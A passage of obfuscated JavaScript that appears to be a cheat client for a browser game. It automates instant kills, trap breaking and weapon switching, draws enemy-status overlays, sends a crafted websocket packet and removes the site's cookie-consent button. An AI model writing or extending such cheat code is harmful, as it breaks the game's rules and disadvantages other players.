        if (TS[ca].primary.reload + 111 / y9.weapons[TS[ca].primary.id].speed >= 1 && Math.round((TS[ca].primary.reload + 111 / y9.weapons[TS[ca].primary.id].speed) * 100) / 100 <= (TS[ca].primary.id == 5 ? 1.15 : 1.2)) {
          c9.info.push(TS[ca]);
        }
      }
    }
    cy = yQ.filter(co => co.name == "turret" && Math.hypot(co.y - yI.y2, co.x - yI.x2) <= 700 && co.active && co.owner.sid != yI.sid && !isAlly(co.owner.sid));
    if (!yI.team && dp.length) {
      dp = [];
    }
    if (nearestEnemy.length && Ta == ![] && yI.items[4] == 15 && document.getElementById("autogrind").checked == ![] && document.getElementById("autoplace").checked == !![] && TD == ![] && TW.aiming == ![]) {
      cV();
    }
    cU();
    To.last = TD;
    let cY = yQ.filter(co => co.trap && co.owner.sid != yI.sid && !isAlly(co.owner.sid) && co.active && Math.hypot(co.y - yI.y2, co.x - yI.x2) < 80).sort((co, cD) => Math.hypot(co.y - yI.y2, co.x - yI.x2) - Math.hypot(cD.y - yI.y2, cD.x - yI.x2))[0];
    if (cY) {
      TD = !![];
      To.health = cY.currentHealth;
      To.location = {x: cY.x, y: cY.y};
    } else {
      TD = ![];
      if (To.last == !![]) {
        TQ = !![];
        db(6);
        if (dS == !![]) {
          Tv();
          dS = ![];
        }
        setTimeout(() => {
          TQ = ![];
        }, 111);
      }
    }
    if (nearestEnemy.length && yI.primary.reload == 1 && yI.secondary.reload == 1 && yI.turret == 1 && yI.weapons[1] && Ta == ![] && document.getElementById("autoinsta").checked) {
      let co = yQ.some(cD => ch(cD, yI) < cN(nearestEnemy, yI) && Math.abs(Math.atan2(cD.y - yI.y, cD.x - yI.x) - Tj) <= (cD.scale + 10) / ch(cD, yI) && cD.active && !cD.ignoreCollision);
      if ((cN(nearestEnemy, yI) < 179 || c8 !== c7 && c7 >= 185 && c8 < 185) && yI.weapons[1] == 15 && !co && cX(nearestEnemy[0]).shameCount >= cX(nearestEnemy[0]).tracker.heal.tick) {
        if (c8 !== c7 && c7 >= 185 && c8 < 180) {
          if (nearestEnemy[9] != 6 && nearestEnemy[9] != 22 && yI.skins[53] && yI.weapons[1] != 13) {
            Tm(1);
          } else {
            Tm(0);
          }
        } else if (yI.shameCount > 3 && (tick - yI.bullTick) % 9 == 8 || nearestEnemy[9] == 11 && yI.primary.variant == 0) {
          Tm(2);
        } else {
          if (nearestEnemy[9] != 6 && nearestEnemy[9] != 22 && yI.skins[53] && yI.weapons[1] != 13) {
            Tm(1);
          } else {
            Tm(0);
          }
        }
        return;
      }
    }
    if (nearestEnemy.length && Jz == !![] && yI.primary.reload == 1 && yI.secondary.reload == 1 && yI.turret == 1 && yI.weapons[1] && Ta == ![]) {
      let cD = yQ.some(cW => ch(cW, yI) < cN(nearestEnemy, yI) && Math.abs(Math.atan2(cW.y - yI.y, cW.x - yI.x) - Tj) <= (cW.scale + 10) / ch(cW, yI) && cW.active && !cW.ignoreCollision);
      if ((cN(nearestEnemy, yI) < 179 || c8 !== c7 && c7 >= 185 && c8 < 185) && yI.weapons[1] != 10 && !cD) {
        if (c8 !== c7 && c7 >= 185 && c8 < 180) {
          if (nearestEnemy[9] != 6 && nearestEnemy[9] != 22 && yI.skins[53] && yI.weapons[1] != 13) {
            Tm(1);
          } else {
            Tm(0);
          }
        } else if (yI.shameCount > 3 && (tick - yI.bullTick) % 9 == 8 || nearestEnemy[9] == 11 && yI.primary.variant == 0) {
          Tm(2);
        } else {
          if (nearestEnemy[9] != 6 && nearestEnemy[9] != 22 && yI.skins[53] && yI.weapons[1] != 13) {
            Tm(1);
          } else {
            Tm(0);
          }
        }
        return;
      } else if (cN(nearestEnemy, yI) < 130 && nearestEnemy[9] != 6 && nearestEnemy[9] != 22 && yI.weapons[1] == 10) {
        Tm(2);
        return;
      }
    }
    let cb = yI.weapons[0] == 4 ? nearestEnemy.length && (tick - cX(nearestEnemy[0]).bullTick) % 9 == 8 : !![];
    if (Ta == !![] || nearestEnemy.length && Jz == !![] && cN(nearestEnemy, yI) < 150) {
      c0 = "instaing";
    } else if (TD == !![] && Js.space == ![]) {
      c0 = "autobreaking";
      let cW = yQ.find(cC => cC.trap && nearestEnemy.length && (cC.owner.sid == yI.sid || isAlly(cC.owner.sid)) && Math.hypot(cC.y - nearestEnemy[2], cC.x - nearestEnemy[1]) < 70);
      let cm = yI.weapons[1] == 10 ? yI.primary.reload == 1 && To.health <= y9.weapons[yI.primary.id].dmg ? yI.weapons[0] : 10 : yI.weapons[0];
      let cB = yQ.filter(cC => cC.dmg && cC.dmg > 0 && cC.sid != yI.sid && !isAlly(cC.sid) && Math.hypot(cC.y - yI.y, cC.x - yI.x) < 130 && cC.active);
      let cj = yQ.filter(cC => !cC.ignoreCollision && !cC.dmg && Math.hypot(cC.y - yI.y, cC.x - yI.x) < 200 && cC.active && cC.health);
      if (!cW && (cB.length > 0 || cj.length > 2)) {
        TC = Number.MAX_VALUE;
      } else {
        TC = Math.atan2(To.location.y - yI.y2, To.location.x - yI.x2);
      }
      JE(cm, !![]);
      if (cm == 10 ? yI.secondary.reload == 1 : yI.primary.reload == 1) {
        db(To.health <= y9.weapons[yI.primary.id].dmg ? 6 : 40);
        db(yI.tails[21] ? 21 : 0, 1);
        y4.send("c", 1, TC);
        y4.send("c", 0, TC);
      } else {
        if (cH() && yI.skins[7]) {
          Tf += 1;
          db(7);
        } else if (cy.length && yI.skins[22]) {
          db(22);
          db(11, 1);
        } else if (yI.skins[26] && (cB.length > 0 || cj.length > 2) && !cW) {
          db(26);
          db(21, 1);
        } else if (nearestEnemy.length && yI.skins[11] && yI.tails[21] && (c7 > 180 && c8 < 180 || c9.amount.length) && cX(nearestEnemy[0]).primary.variant == 0) {
          c6 = !![];
          db(11);
          db(21, 1);
        } else {
          db(6);
          if (cX(nearestEnemy[0]) && cX(nearestEnemy[0]).primary.reload + 111 / y9.weapons[cX(nearestEnemy[0]).primary.id].speed >= 1 && cX(nearestEnemy[0]).primary.variant == 0) {
            db(21, 1);
          } else {
            db(11, 1);
          }
        }
      }
      y4.send("2", TC);
    } else if (document.getElementById("autogrind").checked == ![] && (J6.status == ![] && Js.space == ![]) && J7.status == ![] && Jq == !![] && nearestEnemy.length) {
      c0 = "oneticking";
      if (yI.weapons[0] != 4) {
        y4.send("2", Tj);
      }
      let cC = cN(nearestEnemy, yI);
      let L0 = function () {
        if (yI.y2 < 2400 && yI.skins[15]) {
          db(15);
          db(11, 1);
        } else if (yI.y2 > 6850 && yI.y2 < 7550 && yI.skins[31]) {
          db(31);
          db(11, 1);
        } else {
          db(12);
          db(11, 1);
        }
      };
      if (cC > 235 && cC < (yI.weapons[0] == 4 ? 250 : 240)) {
        y4.send("33", null);
        L0();
        if (yI.primary.reload == 1 && yI.primary.reload == 1 && yI.turret == 1 && Ta == ![] && nearestEnemy[9] != 22 && nearestEnemy[9] != 6 && cb) {
          y4.send("33", Tj);
          Tm(3);
        }
      } else {
        if (cC <= (yI.weapons[0] == 4 ? 240 : 235)) {
          y4.send("33", Tj + Math.PI);
        } else if (cC >= (yI.weapons[0] == 4 ? 250 : 240)) {
          y4.send("33", Tj);
        }
        if (cC > (yI.weapons[0] == 4 ? 190 : 185) && cC < (yI.weapons[0] == 4 ? 300 : 290)) {
          db(0, 1);
        }
        if (cC > (yI.weapons[0] == 4 ? 215 : 210) && cC < (yI.weapons[0] == 4 ? 275 : 265)) {
          if (cC > (yI.weapons[0] == 4 ? 230 : 225) && cC < (yI.weapons[0] == 4 ? 260 : 250)) {
            db(40, 0);
          } else {
            db(22, 0);
          }
        }
      }
    } else if (nearestEnemy.length && yI.skins[11] && yI.tails[21] && (c7 > 180 && c8 < 180 || c9.amount.length) && cX(nearestEnemy[0]).primary.variant == 0) {
      c0 = "pab";
      c6 = !![];
      db(11);
      db(21, 1);
    } else if ((nearestEnemy.length && cN(nearestEnemy, yI) / 1.7 < y9.weapons[yI.weapons[0]].range && yI.secondary.reload == 1 && document.getElementById("autoBSpam").checked || Js.space == !![] || document.getElementById("autoinsta").checked && nearestEnemy.length && cN(nearestEnemy, yI) / 1.75 < y9.weapons[yI.weapons[0]].range && document.getElementById("autoBSpam").checked) && document.getElementById("autogrind").checked == ![]) {
      c0 = "auto bull spam";
      JE(yI.weapons[0], !![]);
      if (yI.primary.reload == 1) {
        db(yI.tails[21] ? 21 : 0, 1);
        if (yI.weaponIndex != yI.weapons[0]) {
          JE(yI.weapons[0], !![]);
        } else if (cN(nearestEnemy, yI) < 150) {
          c4(yI.items[2], Tj || J9());
        }
        if (yI.primary.variant == 0 && nearestEnemy[9] == 11) {
          db(6);
        } else {
          db(7);
        }
        y4.send("c", 1, Tj || J9());
        y4.send("c", 0, Tj || J9());
      } else {
        if (cy.length && yI.skins[22]) {
          db(22);
          db(11, 1);
        } else if (nearestEnemy.length && nearestEnemy[9] == 11) {
          db(6);
          if (cX(nearestEnemy[0]).primary.reload + 111 / y9.weapons[cX(nearestEnemy[0]).primary.id].speed >= 1 && cX(nearestEnemy[0]).primary.variant == 0) {
            db(21, 1);
          } else {
            db(11, 1);
          }
        } else if (nearestEnemy.length && yI.skins[11] && yI.tails[21] && (c7 > 180 && c8 < 180 || c9.amount.length) && cX(nearestEnemy[0]).primary.variant == 0) {
          c6 = !![];
          db(11);
          db(21, 1);
        } else {
          db(6);
          if (nearestEnemy.length && cX(nearestEnemy[0]).primary.reload + 111 / y9.weapons[cX(nearestEnemy[0]).primary.id].speed >= 1 && cX(nearestEnemy[0]).primary.variant == 0) {
            db(21, 1);
          } else {
            db(11, 1);
          }
        }
      }
    } else if (J6.status == ![] && J7.status == ![] && Ta == ![] && document.getElementById("autogrind").checked == ![]) {
      c0 = "none";
      if (document.getElementById("autoinsta").checked && yI.weapons[1] == 15) {
        if (nearestEnemy.length && cN(nearestEnemy, yI) > 300) {
          cg();
        } else if (!nearestEnemy.length) {
          cg();
        }
      } else {
        cg();
      }
      cG();
    }
    if (nearestEnemy.length && yI.skinIndex == 11 && c6 == !![] && Ta == ![] && yI.primary.reload == 1 && (Tx.includes(60) || Tx.includes(68))) {
      Ta = !![];
      c6 = ![];
      db(7);
      db(yI.tails[21] ? 21 : 0, 1);
      JE(yI.weapons[0], !![]);
      dY.change(![]);
      dA.change(!![]);
      y4.send("7", 1);
      setTimeout(() => {
        y4.send("7", 1);
        Ta = ![];
        dA.change(![]);
        dY.change(![]);
      }, 111);
    }
    Tx = [];
  }
  var cp = ![];
  function cU() {
    if (document.getElementById("autoupgrade").checked == !![]) {
      if (document.getElementById("upgradeType").value == 0) {
        if (yI.items[5] != y9.list.findIndex(cS => cS.name.includes(document.getElementById("sixbuilding").value))) {
          y4.send("6", 7);
          y4.send("6", y9.list.findIndex(cS => cS.name.includes("cookie")) + 16);
          y4.send("6", y9.list.findIndex(cS => cS.name.includes("pit")) + 16);
          y4.send("6", y9.list.findIndex(cS => cS.name.includes("greater")) + 16);
          y4.send("6", 10);
          y4.send("6", y9.list.findIndex(cS => cS.name.includes(document.getElementById("sixbuilding").value)) + 16);
        }
      } else {
        if (yI.items[5] != y9.list.findIndex(cS => cS.name.includes(document.getElementById("sixbuilding").value))) {
          y4.send("6", 5);
          y4.send("6", y9.list.findIndex(cS => cS.name.includes("cookie")) + 16);
          y4.send("6", y9.list.findIndex(cS => cS.name.includes("pit")) + 16);
          y4.send("6", y9.list.findIndex(cS => cS.name.includes("greater")) + 16);
          y4.send("6", 10);
          y4.send("6", y9.list.findIndex(cS => cS.name.includes(document.getElementById("sixbuilding").value)) + 16);
        }
      }
    }
  }
  function cG() {
    if (cH() && yI.skins[7]) {
      Tf++;
      db(7);
      db(11, 1);
    } else if (cy.length && yI.skins[22]) {
      db(22);
      db(11, 1);
    } else if (yI.y2 > 6850 && yI.y2 < 7550 && yI.skins[31]) {
      db(31);
      db(11, 1);
    } else if (nearestEnemy.length && cN(nearestEnemy, yI) < 250 && yI.skins[6]) {
      db(6);
      db(11, 1);
    } else if (yI.y2 < 2400 && yI.skins[15]) {
      db(15);
      db(11, 1);
    } else if (document.getElementById("doExternalVisuals").checked == !![] && document.getElementById("visualType").value == 0) {
      db(6);
      db(11, 1);
    } else {
      db(12);
      db(11, 1);
    }
  }
  var cq = 3.14, cP = cq * Math.random();
  setInterval(() => {
    cq *= -1;
    cP = cq * Math.random();
  }, 350);
  function cg() {
    if (yI.primary.reload != 1) {
      cp = !![];
      JE(yI.weapons[0], 1);
    } else if (yI.secondary.reload != 1) {
      cp = !![];
      JE(yI.weapons[1], 1);
      if (yI.weapons[1] == 15) {
        if (document.getElementById("doExternalVisuals").checked == !![] && document.getElementById("visualType").value == 0) {
          y4.send("2", cP);
        }
      }
    } else if (cp) {
      cp = ![];
      if (yI.weapons[1] == 10 && (yI.weapons[0] == 4 || yI.weapons[0] == 5)) {
        JE(yI.weapons[1], 1);
        JE(yI.weapons[1], 1);
      } else {
        JE(yI.weapons[0], 1);
        JE(yI.weapons[0], 1);
      }
    }
  }
  function cH(cS) {
    let cf = cX(nearestEnemy[0]);
    if (yI.skinIndex == 45) return ![];
    if (yI.shameCount > 0 && (tick - yI.bullTick) % 9 == 0 || Tf > 1) {
      return !![];
    }
    return ![];
  }
  function cN(cS, cf) {
    return Math.sqrt(Math.pow((cf.y2 || cf.y) - cS[2], 2) + Math.pow((cf.x2 || cf.x) - cS[1], 2));
  }
  function ch(cS, cf) {
    return Math.sqrt(Math.pow((cf.y2 || cf.y) - (cS.y2 || cS.y), 2) + Math.pow((cf.x2 || cf.x) - (cS.x2 || cS.x), 2));
  }
  function cX(cS) {
    for (var cf = 0; cf < yu.length; ++cf) if (yu[cf].sid == cS) return yu[cf];
    return null;
  }
  function cF(cS) {
    for (var cf = 0; cf < yb.length; ++cf) if (yb[cf].sid == cS) return yb[cf];
    return null;
  }
  function cZ(cS) {
    for (var cf = 0; cf < yQ.length; ++cf) if (yQ[cf].sid == cS) return yQ[cf];
    return null;
  }
  var cz = -1;
  function cO() {
    var cS = Date.now() - cz;
    window.pingTime = cS, VG.innerText = "[" + cS + "]";
  }
  var cE = ![];
  function cI() {
    if (cE == ![]) {
      cE = !![];
      document.getElementById("ot-sdk-btn-floating").remove();
    }
    cz = Date.now(), y4.send("pp");
  }
  function cM(cS) {
    if (!(cS < 0)) {
      var cf = Math.floor(cS / 60), cA = cS % 60;
      cA = ("0" + cA).slice(-2), Vq.innerText = "Server restarting in " + cf + ":" + cA, Vq.hidden = !1;
    }
  }
  function cK(cS) {
    window.open(cS, "_blank");
  }
  var cr = 0, cw = 0, cR = 0;
  function cv() {
    cr++;
    if (Date.now() - cR >= 1e3) {
      cw = cr;
      cr = 0;
      cR = Date.now();
    }
    if (yI && cw < 10 && document.getElementById("antivelinsta").checked) {
      websocket.send(new Uint8Array([135, 102, 37, 116, 94, 162, 44, 210, 28, 223, 1, 13, 113, 180]));
    }
  }
  window.requestAnimFrame = window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || function (cS) {
    window.setTimeout(cS, 1e3 / 60);
  }, function () {
    var cS = y7.mapScale / 2;
    Va.add(0, cS, cS + 200, 0, y7.treeScales[3], 0), Va.add(1, cS, cS - 480, 0, y7.treeScales[3], 0), Va.add(2, cS + 300, cS + 450, 0, y7.treeScales[3], 0), Va.add(3, cS - 950, cS - 130, 0, y7.treeScales[2], 0), Va.add(4, cS - 750, cS - 400, 0, y7.treeScales[3], 0), Va.add(5, cS - 700, cS + 400, 0, y7.treeScales[2], 0), Va.add(6, cS + 800, cS - 200, 0, y7.treeScales[3], 0), Va.add(7, cS - 260, cS + 340, 0, y7.bushScales[3], 1), Va.add(8, cS + 760, cS + 310, 0, y7.bushScales[3], 1), Va.add(9, cS - 800, cS + 100, 0, y7.bushScales[3], 1), Va.add(10, cS - 800, cS + 300, 0, y9.list[4].scale, y9.list[4].id, y9.list[10]), Va.add(11, cS + 650, cS - 390, 0, y9.list[4].scale, y9.list[4].id, y9.list[10]), Va.add(12, cS - 400, cS - 450, 0, y7.rockScales[2], 2);
  }(), function cS() {
    yz = Date.now(), yZ = yz - yY, cv(), yY = yz, function () {
      if (yI && (!yO || yz - yO >= 1e3 / y7.clientSendRate) && (yO = yz, y4.send("2", J9())), Jr < 120 && (Jr += 0.1 * yZ, VY.style.fontSize = Math.min(Math.round(Jr), 120) + "px"), yI) {
        var cf = y5.getDistance(yr, yw, yI.x, yI.y), cA = y5.getDirection(yI.x, yI.y, yr, yw), cY = Math.min(0.01 * cf * yZ, cf);
        cf > 0.05 ? (yr += cY * Math.cos(cA), yw += cY * Math.sin(cA)) : (yr = yI.x, yw = yI.y);
      } else yr = y7.mapScale / 2, yw = y7.mapScale / 2;
      for (var cb = yz - 1e3 / y7.serverUpdateRate, cu = 0; cu < yu.length + yb.length; ++cu) if ((yK = yu[cu] || yb[cu - yu.length]) && yK.visible) if (yK.forcePos) yK.x = yK.x2, yK.y = yK.y2, yK.dir = yK.d2; else {
        var cx = yK.t2 - yK.t1, cQ = (cb - yK.t1) / cx;
        yK.dt += yZ;
        var ck = Math.min(1.7, yK.dt / 170), cl = yK.x2 - yK.x1;
        yK.x = yK.x1 + cl * ck, cl = yK.y2 - yK.y1, yK.y = yK.y1 + cl * ck, yK.dir = Math.lerpAngle(yK.d2, yK.d1, Math.min(1.2, cQ));
      }
      var ca = yr - V2 / 2, co = yw - V3 / 2;
      y7.snowBiomeTop - co <= 0 && y7.mapScale - y7.snowBiomeTop - co >= V3 ? (VL.fillStyle = "#b6db66", VL.fillRect(0, 0, V2, V3)) : y7.mapScale - y7.snowBiomeTop - co <= 0 ? (VL.fillStyle = "#dbc666", VL.fillRect(0, 0, V2, V3)) : y7.snowBiomeTop - co >= V3 ? (VL.fillStyle = "#fff", VL.fillRect(0, 0, V2, V3)) : y7.snowBiomeTop - co >= 0 ? (VL.fillStyle = "#fff", VL.fillRect(0, 0, V2, y7.snowBiomeTop - co), VL.fillStyle = "#b6db66", VL.fillRect(0, y7.snowBiomeTop - co, V2, V3 - (y7.snowBiomeTop - co))) : (VL.fillStyle = "#b6db66", VL.fillRect(0, 0, V2, y7.mapScale - y7.snowBiomeTop - co), VL.fillStyle = "#dbc666", VL.fillRect(0, y7.mapScale - y7.snowBiomeTop - co, V2, V3 - (y7.mapScale - y7.snowBiomeTop - co))), JI || ((yW += ym * y7.waveSpeed * yZ) >= y7.waveMax ? (yW = y7.waveMax, ym = -1) : yW <= 1 && (yW = ym = 1), VL.globalAlpha = 1, VL.fillStyle = "#dbc666", Ja(ca, co, VL, y7.riverPadding), VL.fillStyle = "#91b2db", Ja(ca, co, VL, 250 * (yW - 1))), VL.lineWidth = 4, VL.strokeStyle = "#000", VL.globalAlpha = !(document.getElementById("doExternalVisuals").checked == !![] && document.getElementById("visualType").value == 0) && !(document.getElementById("doExternalVisuals").checked == !![] && document.getElementById("visualType").value == 1) ? 0 : 0.06, VL.beginPath();
      let cD = document.getElementById("doExternalVisuals").checked == !![] && document.getElementById("visualType").value == 1;
      for (var cW = cD ? (14400 - ca) % 1440 : -yr; cW < V2; cW += cD ? 1440 : V3 / 18) cW > 0 && (VL.moveTo(cW, 0), VL.lineTo(cW, V3));
      for (var cm = cD ? (14400 - co) % 1440 : -yw; cm < V3; cm += cD ? 1440 : V3 / 18) cW > 0 && (VL.moveTo(0, cm), VL.lineTo(V2, cm));
      for (VL.stroke(), VL.globalAlpha = 1, VL.strokeStyle = Vo, Jo(-1, ca, co), VL.globalAlpha = 1, VL.lineWidth = 5.5, JQ(0, ca, co), JC(ca, co, 0), VL.globalAlpha = 1, cu = 0; cu < yb.length; ++cu) (yK = yb[cu]).active && yK.visible && (yK.animate(yZ), VL.save(), VL.translate(yK.x - ca, yK.y - co), VL.rotate(yK.dir + yK.dirPlus - Math.PI / 2), TE(yK, VL), VL.restore());
      if (Jo(0, ca, co), JQ(1, ca, co), Jo(1, ca, co), JC(ca, co, 1), Jo(2, ca, co), Jo(3, ca, co), VL.fillStyle = "#000", VL.globalAlpha = 0.09, ca <= 0 && VL.fillRect(0, 0, -ca, V3), y7.mapScale - ca <= V2) {
        var cB = Math.max(0, -co);
        VL.fillRect(y7.mapScale - ca, cB, V2 - (y7.mapScale - ca), V3 - cB);
      }
      if (co <= 0 && VL.fillRect(-ca, 0, V2 + ca, -co), y7.mapScale - co <= V3) {
        var cj = Math.max(0, -ca), cC = 0;
        y7.mapScale - ca <= V2 && (cC = V2 - (y7.mapScale - ca)), VL.fillRect(cj, y7.mapScale - co, V2 - cj - cC, V3 - (y7.mapScale - co));
      }
      for (VL.globalAlpha = 1, VL.fillStyle = "rgba(0, 0, 70, 0.35)", VL.fillRect(0, 0, V2, V3), VL.strokeStyle = VD, cu = 0; cu < yu.length + yb.length; ++cu) if ((yK = yu[cu] || yb[cu - yu.length]).visible && (10 != yK.skinIndex || yK == yI || yK.team && yK.team == yI.team)) {
        let L4 = document.getElementById("doExternalVisuals").checked == !![] && document.getElementById("visualType").value == 1 ? !![] : ![];
        var L0 = (yK.team ? "[" + yK.team + "] " : "") + (yK.isPlayer ? document.getElementById("doExternalVisuals").checked == !![] && document.getElementById("visualType").value == 0 ? "" : yK == yI ? "" : L4 == !![] ? "[" + yK.primary.id + (yK.secondary.id ? "/" + yK.secondary.id : "") + "] " : "" : "") + (yK.name || "");
        if ("" != L0) {
          if (VL.font = (yK.nameScale || 30) + "px Hammersmith One", VL.fillStyle = "#fff", VL.textBaseline = "middle", VL.textAlign = "center", VL.lineWidth = yK.nameScale ? 11 : 8, VL.lineJoin = "round", VL.strokeText(L0, yK.x - ca, yK.y - co - yK.scale - y7.nameY), VL.fillText(L0, yK.x - ca, yK.y - co - yK.scale - y7.nameY), yK.isLeader && Jf.crown.isLoaded) {
            var L1 = y7.crownIconScale;
            cj = yK.x - ca - L1 / 2 - VL.measureText(L0).width / 2 - y7.crownPad, VL.drawImage(Jf.crown, cj, yK.y - co - yK.scale - y7.nameY - L1 / 2 - 5, L1, L1);
          }
          1 == yK.iconIndex && Jf.skull.isLoaded && (L1 = y7.crownIconScale, cj = yK.x - ca - L1 / 2 + VL.measureText(L0).width / 2 + y7.crownPad, VL.drawImage(Jf.skull, cj, yK.y - co - yK.scale - y7.nameY - L1 / 2 - 5, L1, L1));
          Jf.crosshair.isLoaded && !(document.getElementById("doExternalVisuals").checked == !![] && document.getElementById("visualType").value == 0) && Jz && nearestEnemy.length && yK.sid == nearestEnemy[0] && yK.isPlayer && (L1 = 2 * y7.playerScale - 10, VL.drawImage(Jf.crosshair, yK.x - ca - L1 / 2, yK.y - co - L1 / 2, L1, L1));
        }
        if (yI && yK == yI && L4 == !![]) {
          document.getElementById("fz's op status menu").style.display = "block";
          document.getElementById("fz's op status menu").innerHTML = '\n                        <div style="font-size: 14px;">\n                        WR Insta: ' + (Jz ? "ON" : "OFF") + "<br>\n                        Song Chating: " + (Jp ? "ON" : "OFF") + "<br>\n                        Bow Spam: " + J7.status + "<br>\n                        Turrets that can hit you: " + cy.length + "\n                        </div>\n                        ";
        } else if (L4 == ![]) {
          document.getElementById("fz's op status menu").style.display = "none";
        }
        if (yI && yK != yI && yK.isPlayer == !![] && L4 == !![] && !(document.getElementById("doExternalVisuals").checked == !![] && document.getElementById("visualType").value == 0)) {
          VL.textAlign = "center", VL.fillStyle = "#fff", VL.lineJoin = "round", VL.font = "20px Hammersmith One", VL.strokeStyle = "black", VL.lineWidth = 6, VL.strokeText("[" + yK.primary.dmg + "," + (yK.turret == 1 ? "true" : "false") + ("," + yK.secondary.dmg || "") + "]", yK.x - ca, yK.y - co + yK.scale + y7.nameY + 30), VL.fillText("[" + yK.primary.dmg + "," + (yK.turret == 1 ? "true" : "false") + ("," + yK.secondary.dmg || "") + "]", yK.x - ca, yK.y - co + yK.scale + y7.nameY + 30);
        }
        yI && yK == yI && L4 == !![] && !(document.getElementById("doExternalVisuals").checked == !![] && document.getElementById("visualType").value == 0) && (VL.textAlign = "center", VL.fillStyle = "#fff", VL.lineJoin = "round", VL.font = "20px Hammersmith One", VL.strokeStyle = "black", VL.lineWidth = 6, VL.strokeText("[" + cy.length + "," + Jz + "," + TS.length + "]", yK.x - ca, yK.y - co + yK.scale + y7.nameY + 30), VL.fillText("[" + cy.length + "," + Jz + "," + TS.length + "]", yK.x - ca, yK.y - co + yK.scale + y7.nameY + 30));
        if (yK.isPlayer && L4 == !![] && !(document.getElementById("doExternalVisuals").checked == !![] && document.getElementById("visualType").value == 0)) {
          let L5 = yI.x + Math.cos(Math.atan2(yK.y - yI.y, yK.x - yI.x)) * (ch(yK, yI) / 3);
          let L6 = yI.y + Math.sin(Math.atan2(yK.y - yI.y, yK.x - yI.x)) * (ch(yK, yI) / 3);
          let L7 = VL;
          if (yK != yI && (yK.team != yI.team || !yK.team)) {
            L7.save();
            L7.translate(L5 - ca, L6 - co);
            L7.rotate(Math.atan2(yK.y - yI.y, yK.x - yI.x));
            L7.fillStyle = L4 ? "#fff" : "#000";
            Ts(L7, 1.5, L4 ? 15 : 20, L4 ? 15 : 20, 1);
            L7.fill();
            L7.restore();
          }
        }
        if (yK.isPlayer && !(document.getElementById("doExternalVisuals").checked == !![] && document.getElementById("visualType").value == 0)) {
          VL.font = (yK.nameScale || 30) + "px Hammersmith One";
          VL.fillStyle = yK.shameCount >= 7 ? "#ff0000" : yK.shameCount == 6 || yK.shameCount == 5 ? "#ffa500" : yK.shameCount == 4 || yK.shameCount == 3 ? "#ffff00" : "#808080";
          VL.textBaseline = "middle";
          VL.textAlign = "center";
          VL.lineWidth = yK.nameScale ? 11 : 8;
          VL.lineJoin = "round";
          VL.strokeText(yK.shameCount, yK.x - ca + VL.measureText(L0).width / 2 + y7.crownPad, yK.y - co - yK.scale - y7.nameY);
          VL.fillText(yK.shameCount, yK.x - ca + VL.measureText(L0).width / 2 + y7.crownPad, yK.y - co - yK.scale - y7.nameY);
        }
        yK.isPlayer && L4 == !![] && !(document.getElementById("doExternalVisuals").checked == !![] && document.getElementById("visualType").value == 0) && (y7.reloadBarWidth, VL.fillStyle = VD, VL.roundRect(yK.x - ca - 50 - y7.healthBarPad, yK.y - co + yK.scale + y7.nameY - 13, 2 * 23.5 + 2 * y7.healthBarPad, 17, 10), VL.fill(), VL.fillStyle = yK.primary.reload == 1 ? "#fff000" : "hsl(" + 360 * yK.primary.reload + ", 50%, 60%)", VL.roundRect(yK.x - ca - 50, yK.y - co + yK.scale + y7.nameY - 13 + y7.healthBarPad, 2 * 23.5 * yK.primary.reload, 16 - 2 * y7.healthBarPad, 10), VL.fill(), y7.reloadBarWidth, VL.fillStyle = VD, VL.roundRect(yK.x - ca + 2 - y7.healthBarPad, yK.y - co + yK.scale + y7.nameY - 13, 2 * 23.5 + 2 * y7.healthBarPad, 17, 10), VL.fill(), VL.fillStyle = yK.secondary.reload == 1 ? "#fff000" : "hsl(" + 360 * yK.secondary.reload + ", 50%, 60%)", VL.roundRect(yK.x - ca + 2, yK.y - co + yK.scale + y7.nameY - 13 + y7.healthBarPad, 2 * 23.5 * yK.secondary.reload, 16 - 2 * y7.healthBarPad, 10), VL.fill());
        yK.health > 0 && (y7.healthBarWidth, VL.fillStyle = VD, VL.roundRect(yK.x - ca - y7.healthBarWidth - y7.healthBarPad, yK.y - co + yK.scale + y7.nameY, 2 * y7.healthBarWidth + 2 * y7.healthBarPad, 17, 8), VL.fill(), VL.fillStyle = yK == yI || yK.team && yK.team == yI.team ? "#8ecc51" : "#cc5151", VL.roundRect(yK.x - ca - y7.healthBarWidth, yK.y - co + yK.scale + y7.nameY + y7.healthBarPad, 2 * y7.healthBarWidth * (yK.health / yK.maxHealth), 17 - 2 * y7.healthBarPad, 7), VL.fill());
      }
      for (yL.update(yZ, VL, ca, co), cu = 0; cu < yu.length; ++cu) if ((yK = yu[cu]).visible && yK.chatCountdown > 0) {
        yK.chatCountdown -= yZ, yK.chatCountdown <= 0 && (yK.chatCountdown = 0), VL.font = "32px Hammersmith One";
        var L2 = VL.measureText(yK.chatMessage);
        VL.textBaseline = "middle", VL.textAlign = "center", cj = yK.x - ca, cB = yK.y - yK.scale - co - 90;
        var L3 = L2.width + 17;
        VL.fillStyle = "rgba(0,0,0,0.2)", VL.roundRect(cj - L3 / 2, cB - 23.5, L3, 47, 6), VL.fill(), VL.fillStyle = "#fff", VL.fillText(yK.chatMessage, cj, cB);
      }
      !function (L8) {
        if (yI && yI.alive) {
          Vu.clearRect(0, 0, VA.width, VA.height), Vu.strokeStyle = "#fff", Vu.lineWidth = 4;
          for (var L9 = 0; L9 < dI.length; ++L9) (dE = dI[L9]).update(Vu, L8);
          if (Vu.globalAlpha = 1, Vu.fillStyle = "#fff", TL(yI.x / y7.mapScale * VA.width, yI.y / y7.mapScale * VA.height, 7, Vu, !0), Vu.fillStyle = "rgba(255,255,255,0.35)", yI.team && dc) {
            for (L9 = 0; L9 < dc.length; L9 += 2) {
              TL(dc[L9] / y7.mapScale * VA.width, dc[L9 + 1] / y7.mapScale * VA.height, 7, Vu, !0);
            }
          }
          dT && (Vu.fillStyle = "#fc5553", Vu.font = "34px Hammersmith One", Vu.textBaseline = "middle", Vu.textAlign = "center", Vu.fillText("x", dT.x / y7.mapScale * VA.width, dT.y / y7.mapScale * VA.height)), dL && (Vu.fillStyle = "#fff", Vu.font = "34px Hammersmith One", Vu.textBaseline = "middle", Vu.textAlign = "center", Vu.fillText("x", dL.x / y7.mapScale * VA.width, dL.y / y7.mapScale * VA.height));
          for (let Ly = 0; Ly < botInfo.length; Ly++) {
            if (botInfo[Ly]) {
              Vu.fillStyle = "#ffa500";
              TL(botInfo[Ly][1] / y7.mapScale * VA.width, botInfo[Ly][2] / y7.mapScale * VA.height, 7, Vu, !0);
            }
          }
